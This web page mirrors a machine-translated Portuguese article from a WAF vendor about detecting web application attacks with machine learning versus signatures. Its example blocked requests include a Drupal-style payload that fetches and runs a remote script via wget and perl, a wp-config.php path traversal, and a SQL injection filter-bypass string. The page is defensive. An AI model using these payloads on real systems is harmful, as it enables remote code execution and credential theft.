<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë®üèº‚Äçüéì üå•Ô∏è üéΩ Aprendizado de m√°quina versus an√°lise de assinatura ao detectar ataques em um aplicativo Web üÖ±Ô∏è üê≤ üíù</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Sobre como desenvolvemos um m√≥dulo de aprendizado de m√°quina, por que abandonamos as redes neurais na dire√ß√£o de algoritmos cl√°ssicos, quais ataques s...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Aprendizado de m√°quina versus an√°lise de assinatura ao detectar ataques em um aplicativo Web</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pentestit/blog/427577/"><img src="https://habrastorage.org/webt/ss/qm/5e/ssqm5egtqaflfxwrtwhalbmbj3s.png"><br><br>  Sobre como desenvolvemos um m√≥dulo de aprendizado de m√°quina, por que abandonamos as redes neurais na dire√ß√£o de algoritmos cl√°ssicos, quais ataques s√£o detectados devido √† dist√¢ncia de Levenshtein e l√≥gica fuzzy e qual m√©todo de detec√ß√£o de ataques (ML ou assinatura) funciona com mais efici√™ncia. <a name="habracut"></a><br><br><h2>  Usando o aprendizado de m√°quina para detectar ataques </h2><br>  Observando a crescente popularidade das consultas de ML (bem como a seguran√ßa cibern√©tica) no Google: <br><br><img src="https://habrastorage.org/webt/cq/xs/ux/cqxsux5_pv6ofu8ub1_tdcus_mo.png"><br><br>  e sabendo que as solicita√ß√µes HTTP s√£o texto sem formata√ß√£o (embora sem sentido), e a sintaxe do protocolo permite que voc√™ interprete os dados como strings: <br><br><div class="spoiler">  <b class="spoiler_title">Exemplo de solicita√ß√£o leg√≠tima</b> <div class="spoiler_text"><code>28/Aug/2018:16:55:24 +0300; <br> 200; <br> 127.0.0.1; <br> http; <br> example.com; <br> GET /login.php HTTP/1.1; <br> PHPSESSID=vqmi2ptvisohf62lru0shg3ll7; <br> Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 <br> Safari/537.21; <br> -; <br> -; <br> -----------START-BODY----------- <br> -; <br> -----------END-BODY---------- <br></code> </div></div><br><div class="spoiler">  <b class="spoiler_title">Exemplo de uma solicita√ß√£o ileg√≠tima</b> <div class="spoiler_text"> <code>28/Aug/2018:16:55:24 +0300; <br> 200; <br> 127.0.0.1; <br> http; <br> example.com; <br> GET /login.php?search= HTTP/1.1; <br> PHPSESSID=vqmi2ptvisohf62lru0shg3ll7; <br> Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 <br> Safari/537.21; <br> -; <br> -; <br> -----------START-BODY----------- <br> -; <br> -----------END-BODY--------- <br></code> </div></div><br>  decidimos tentar implementar um m√≥dulo de aprendizado de m√°quina para detectar ataques a um aplicativo da web. <br><br>  Antes de iniciar o desenvolvimento, formulamos o problema: <br><blockquote>  Ensinar o m√≥dulo de aprendizado de m√°quina a detectar ataques a aplicativos da Web pelo conte√∫do da solicita√ß√£o HTTP, ou seja, a classific√°-las (pelo menos bin√°rio: solicita√ß√£o leg√≠tima ou ileg√≠tima). </blockquote><br>  Usando o esquema geral de classifica√ß√£o de string <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/v_/oa/ww/v_oawwo9u2fbyqrcuh1ubijhfws.png"></div><br>  <sup>Fonte: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">www.researchgate.net/publication/228084521_Text_Classification_Using_Machine_Learning_Techniques</a></sup> <br>  vamos analisar <br><br><img src="https://habrastorage.org/webt/ry/ys/sa/ryyssaq17gjeq-_gfbeylkzdeia.png"><br>  e adapta√ß√£o √† nossa tarefa: <br><br><h3>  Etapa 1. Processamento de tr√°fego. </h3><br>  Analisamos solicita√ß√µes HTTP recebidas com a possibilidade de bloque√°-las. <br><br><h3>  Etapa 2. Defini√ß√£o de sinais. </h3><br>  O conte√∫do das solicita√ß√µes HTTP n√£o √© um texto significativo, portanto, para trabalhar com <br>  n√£o usamos palavras, mas n-gramas (escolher n tamb√©m √© uma tarefa separada). <br><br><h3>  Etapas 3 e 4. Filtragem. </h3><br>  Os est√°gios se relacionam mais ao texto significativo, portanto, n√£o s√£o necess√°rios para resolver o problema, n√≥s o exclu√≠mos. <br><br><h3>  Etapa 5. Converta em uma visualiza√ß√£o de vetor. </h3><br>  Com base na an√°lise da pesquisa cient√≠fica e dos prot√≥tipos existentes, foi constru√≠do um esquema <br>  a opera√ß√£o do m√≥dulo de aprendizado de m√°quina e depois de analisar os dados, um espa√ßo de recurso √© formado por elementos.  Como a maioria dos recursos √© textual, eles foram vetorizados para uso posterior no algoritmo de reconhecimento.  E como os campos de consulta n√£o s√£o palavras separadas e geralmente consistem em sequ√™ncias de caracteres, decidiu-se usar uma abordagem baseada na an√°lise da frequ√™ncia de ocorr√™ncia de n-gramas (TFIDF, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">ru.wikipedia.org/wiki/TF-IDF</a> ). <br><br>  O problema de detectar ataques do ponto de vista matem√°tico foi formalizado como um cl√°ssico <br>  tarefa de classifica√ß√£o (duas classes: tr√°fego leg√≠timo e ileg√≠timo).  Escolha de Algoritmos <br>  foi realizada de acordo com o crit√©rio de acessibilidade da implementa√ß√£o e a possibilidade de teste.  O melhor <br>  O algoritmo de aumento de gradiente (AdaBoost) mostrou-se de certa forma.  Assim, ap√≥s o treinamento, a tomada de decis√£o do Nemesida WAF √© baseada em propriedades estat√≠sticas. <br>  dados analisados ‚Äã‚Äãe n√£o com base em sinais determinados (assinaturas) de ataques. <br><br>  Na figura abaixo, voc√™ pode ver como √© executada a convers√£o cl√°ssica para texto significativo: <br><img src="https://habrastorage.org/webt/36/nf/a0/36nfa0trsbqcmt1w4xlsovoevja.png"><br>  <sup>Fonte: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">habr.com/company/ods/blog/329410</a></sup> <br><br>  No nosso caso, em vez de um "pacote de palavras" usamos n-gramas. <br><br><h3>  Etapa 6. Destacando o dicion√°rio de sinais. </h3><br>  Tomamos o resultado do algoritmo TFIDF e reduzimos o n√∫mero de sinais (controle, <br>  por exemplo, par√¢metro de frequ√™ncia). <br><br><h3>  Etapa 7. Aprendendo o algoritmo. </h3><br>  N√≥s fazemos a escolha do algoritmo e seu treinamento.  Ap√≥s o treinamento (durante o reconhecimento), apenas bloqueia 1, 5, 6 + trabalho de reconhecimento. <br><br><h2>  Sele√ß√£o de algoritmo </h2><br><img src="https://habrastorage.org/webt/vu/w6/za/vuw6zaveibvt-kdsaotkaqxjlh8.png"><br><br>  Ao escolher um algoritmo de aprendizado, praticamente tudo que foi inclu√≠do no pacote scikit-learn foi considerado. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/7-/6v/a1/7-6va1wdmubplzcltkiwrsy3oqm.png"></div><br><br>  O aprendizado profundo fornece alta precis√£o, mas: <br>  - requer grandes gastos em recursos, tanto para o processo de aprendizado (na GPU) quanto para o processo de reconhecimento (a infer√™ncia tamb√©m pode estar na CPU); <br>  - o tempo necess√°rio para processar a solicita√ß√£o excede significativamente o tempo de processamento usando algoritmos cl√°ssicos. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/ng/qj/yd/ngqjydlbg_vdsc4edxwoz6lwdqk.png"></div><br><br>  Como nem todos os usu√°rios em potencial do Nemesida WAF ter√£o a oportunidade de comprar um servidor com uma GPU para aprendizado profundo, e o tempo de processamento de solicita√ß√µes √© um fator chave, decidimos usar algoritmos cl√°ssicos que, com uma boa amostra de treinamento, fornecem precis√£o pr√≥xima aos m√©todos de aprendizado profundo e dimensionam bem para qualquer plataforma. <br><table><tbody><tr><th>  Algoritmo cl√°ssico </th><th>  Redes neurais multicamadas </th></tr><tr><td>  1. Alta precis√£o apenas com uma boa amostra de treinamento. <br>  2. N√£o exigente em hardware. <br></td><td>  1. Altos requisitos de hardware (GPU). <br>  2. O tempo de processamento da consulta excede significativamente o tempo de processamento usando algoritmos cl√°ssicos. <br></td></tr></tbody></table><br><blockquote>  O WAF para proteger aplicativos da Web √© uma ferramenta necess√°ria, mas nem todos t√™m a oportunidade de comprar ou alugar equipamentos caros com uma GPU para treinamento.  Al√©m disso, o tempo de processamento da solicita√ß√£o (no modo IPS padr√£o) √© um indicador cr√≠tico.  Com base no exposto, decidimos nos concentrar no algoritmo de aprendizado cl√°ssico. </blockquote><br><br><h2>  Estrat√©gia de Desenvolvimento de ML </h2><br>  No desenvolvimento do m√≥dulo de aprendizado de m√°quina (Nemesida AI), foi utilizada a seguinte estrat√©gia: <br>  - Fixamos o n√≠vel de falsos positivos no valor (at√© 0,04% em 2017, at√© 0,01% em 2018); <br>  - Aumente o n√≠vel de detec√ß√£o ao m√°ximo em um determinado n√≠vel de falsos positivos. <br><br>  Com base na estrat√©gia escolhida, os par√¢metros do classificador s√£o selecionados levando em considera√ß√£o o cumprimento de cada uma das condi√ß√µes e o resultado da resolu√ß√£o do problema de gera√ß√£o de amostras de treinamento de duas classes com base no modelo de espa√ßo vetorial (tr√°fego e ataques leg√≠timos) afeta diretamente a qualidade do classificador. <br><br>  A amostra de treinamento de tr√°fego ileg√≠timo √© baseada no banco de dados existente de ataques obtidos de v√°rias fontes, e o tr√°fego leg√≠timo √© baseado em solicita√ß√µes recebidas pelo aplicativo Web protegido e reconhecidas pelo analisador de assinaturas como leg√≠timas.  Essa abordagem permite adaptar o sistema de treinamento Nemesida AI a um aplicativo da web espec√≠fico, reduzindo ao m√≠nimo o n√≠vel de falsos positivos.  O tamanho da amostra gerada de tr√°fego leg√≠timo depende da quantidade de RAM livre no servidor no qual o m√≥dulo de aprendizado de m√°quina opera.  A configura√ß√£o recomendada para o treinamento do modelo √© de 400.000 solicita√ß√µes com 32 GB de RAM livre. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/nk/yn/gb/nkyngb9ukvejopgroq-j9lvbrwi.png"></div><br><br><h2>  Valida√ß√£o cruzada: selecione o coeficiente </h2><br>  Utilizando o valor √≥timo dos coeficientes para valida√ß√£o cruzada, selecionamos um m√©todo baseado em uma floresta aleat√≥ria (Floresta Aleat√≥ria), que nos permitiu alcan√ßar os seguintes indicadores: <br>  - n√∫mero de falsos positivos (PF): 0,01% <br>  - n√∫mero de passes (FN) 0,01% <br>  Assim, a precis√£o de detectar ataques em um aplicativo da Web pelo m√≥dulo Nemesida AI √© de 99,98%. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/0w/eh/yf/0wehyf4xa6yedjayfdmtsnhhzi0.gif"></div><br><br><h2>  O resultado do m√≥dulo ML </h2><br><div class="spoiler">  <b class="spoiler_title">Solicita√ß√µes bloqueadas por um conjunto de sintomas de anomalia</b> <div class="spoiler_text"> <code>... <br> URI: /user/password <br> Args: name[#post_render][0]=printf&amp;name[#markup]=ABCZ%0A <br> UA: Python-urllib/2.7 <br> Cookie: - <br> ... <br></code> <br> <code>... <br> URI: /wp-admin/admin-ajax.php <br> Zone: ARGS <br> Parameters: action=revslider_show_image&amp;img=../wp-config.php <br> Cookies: - <br> ... <br></code> <br></div></div><br><div class="spoiler">  <b class="spoiler_title">Tentativa de desvio do WAF</b> <div class="spoiler_text"> <code>... <br> Body: /?id=1+un/**/ion+sel/**/ect+1,2,3-- <br> ... <br></code> <br></div></div><br><div class="spoiler">  <b class="spoiler_title">Solicita√ß√£o perdida pelo m√©todo de assinatura, mas bloqueada pelo ML</b> <div class="spoiler_text"> <code>Host: example.com <br> URI: / <br> Args: q=user%2Fpassword&amp;name%5B%23markup%5D=cd+%2Ftmp%3Bwget+146.185.X.39%2Flug <br> %3Bperl+lug%3Brm+-rf+lug&amp;name%5B%23type%5D=markup&amp;name%5B%23post_render%5D%5B <br> %5D=passthru <br> UA: python-requests/2.5.3 CPython/3.4.8 Linux/2.6.32-042stab128.2 <br> Cookie: -</code> <br> </div></div><br><br><h2>  Bloquear ataques de for√ßa bruta </h2><br>  A detec√ß√£o de ataques de for√ßa bruta (BF) √© um componente importante do WAF moderno.  Detectar esses ataques √© mais f√°cil que o SQLi, XSS e outros.  Al√©m disso, a detec√ß√£o de ataques BF √© realizada em c√≥pias de tr√°fego, sem afetar o tempo de resposta do aplicativo da web. <br><br>  Na Nemesida AI, os ataques de for√ßa bruta s√£o identificados da seguinte forma: <br>  1. Analisamos c√≥pias de solicita√ß√µes recebidas pelo aplicativo da web. <br>  2. Extra√≠mos os dados necess√°rios para a tomada de decis√£o (IP, URL, ARGS, BODY). <br>  3. N√≥s filtramos os dados recebidos, excluindo URIs n√£o alvo, para reduzir o n√∫mero de falsos positivos. <br>  4. Calculamos as dist√¢ncias m√∫tuas entre as solicita√ß√µes (escolhemos a dist√¢ncia de Levenshtein e a l√≥gica fuzzy). <br>  5. Selecione solicita√ß√µes de um IP para um URI espec√≠fico √† medida que s√£o fechadas, ou solicita√ß√µes de todo IP para um URI espec√≠fico (para identificar ataques BF distribu√≠dos) dentro de uma janela de tempo espec√≠fica. <br>  6. Bloqueamos a (s) fonte (s) do ataque quando os valores limite s√£o excedidos. <br><br><h2>  Aprendizado de m√°quina ou an√°lise de assinaturas </h2><br>  Em resumo, destacamos os recursos de cada m√©todo: <br><table><tbody><tr><th>  An√°lise de assinatura </th><th>  Aprendizado de m√°quina </th></tr><tr><td>  Vantagens: <br>  1. A velocidade de processamento da solicita√ß√£o √© maior. <br><br>  Desvantagens: <br>  1. O n√∫mero de falsos positivos √© maior; <br>  2. A precis√£o de detectar ataques √© menor; <br>  3. N√£o revela novos sinais de ataques; <br>  4. N√£o detecta anomalias (incluindo ataques de for√ßa bruta); <br>  5. Incapaz de avaliar o n√≠vel de anomalias; <br>  6. Nem todo ataque √© poss√≠vel fazer uma assinatura. <br></td><td>  Vantagens: <br>  1. Detecta ataques com mais precis√£o; <br>  2. O n√∫mero de falsos positivos √© m√≠nimo; <br>  3. Identifica anomalias; <br>  4. Revela novos sinais de ataques; <br>  5. Requer recursos adicionais de hardware. <br><br>  Desvantagens: <br>  1. A velocidade de processamento de solicita√ß√µes √© menor. <br></td></tr></tbody></table><br>  Com base nos novos sinais de um ataque detectado pelo m√≥dulo ML, estamos atualizando um conjunto de assinaturas, que tamb√©m s√£o usadas no <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Nemesida WAF Free</a> , uma vers√£o gratuita que fornece prote√ß√£o b√°sica para um aplicativo Web, √© f√°cil de instalar e manter, e n√£o possui altos requisitos de hardware. <br><br>  <b>Conclus√£o:</b> para identificar ataques a um aplicativo Web, √© necess√°ria uma abordagem combinada baseada no aprendizado de m√°quina e na an√°lise de assinaturas. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt427577/">https://habr.com/ru/post/pt427577/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt427567/index.html">Mapas hexagonais no Unity: ciclo da √°gua, eros√£o, biomas, mapa cil√≠ndrico</a></li>
<li><a href="../pt427569/index.html">Ajuste o OpenStack sob alta carga</a></li>
<li><a href="../pt427571/index.html">A uni√£o do R e do PostgreSQL. Analisamos o trabalho dos aeroportos, calculamos pens√µes</a></li>
<li><a href="../pt427573/index.html">Candy or Life: Halloween como uma raz√£o para atrair seu filho para a ci√™ncia</a></li>
<li><a href="../pt427575/index.html">Por que o Wi-Fi n√£o funcionar√° conforme o planejado e por que saber qual telefone o funcion√°rio usa</a></li>
<li><a href="../pt427579/index.html">Distribui√ß√£o de aplicativos para iOS dentro da empresa (Enterprise Distribute iOS App in house)</a></li>
<li><a href="../pt427581/index.html">Testando pontos de acesso Zyxel vs Ubiquiti</a></li>
<li><a href="../pt427583/index.html">N√≥s nos comunicamos com jornalistas de rela√ß√µes p√∫blicas influentes: s√£o 10 segredos que aumentar√£o a probabilidade de publica√ß√£o do seu artigo</a></li>
<li><a href="../pt427585/index.html">A receita para um jogo MMO popular e bem-sucedido.</a></li>
<li><a href="../pt427587/index.html">Java concentrado para mil e quinhentas pessoas. Como foi o Coringa 2018</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>